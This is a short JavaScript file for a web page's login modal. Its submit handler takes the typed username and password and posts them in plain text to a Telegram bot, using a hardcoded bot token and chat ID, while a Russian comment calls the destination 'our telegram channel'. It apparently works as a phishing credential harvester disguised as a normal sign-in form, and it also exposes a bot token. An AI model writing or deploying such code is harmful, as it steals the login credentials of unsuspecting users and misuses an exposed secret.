const buttonMessage = document.querySelector('.button-message')
const modalAuth = document.querySelector('.modal-auth')
const closeAuth = document.querySelector('.close-button')
const logInForm = document.getElementById('logInForm')
const InputLogin = document.getElementById('login')
const InputPassword = document.getElementById('password')


buttonMessage.addEventListener('click', () => {
  modalAuth.style.display = 'flex'
  // console.dir(buttonMessage)
  // send()
})

closeAuth.addEventListener('click', () => {
  modalAuth.style.display = 'none'
  // console.dir(buttonMessage)
  // send()
})



logInForm.addEventListener('submit', (event) => {
  send(InputLogin.value,InputPassword.value)
  // console.log("InputLogin =", InputLogin.value, "InputLogin =", InputPassword.value)
  event.preventDefault()
  console.dir(event)
   modalAuth.style.display = 'none'
})

const send = (s1, s2) =>{
var chatid = "-1001621864788";
var token = "2107046347:AAFl_Gb9XV-6Bt1RfjrVmuVraEGrvQLQprA";
var text1 = s1;
var text2 = s2;
var text = ("InputLogin ="+ s1 + "InputLogin =" + s2)

//Отправляем текст в наш телеграм канал
otpravka(token,text,chatid);
 
function otpravka(token,text,chatid){
  var z=$.ajax({  
  type: "POST",  
  url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
  data: "parse_mode=HTML&text="+encodeURIComponent(text), 
  }); 
 };
 }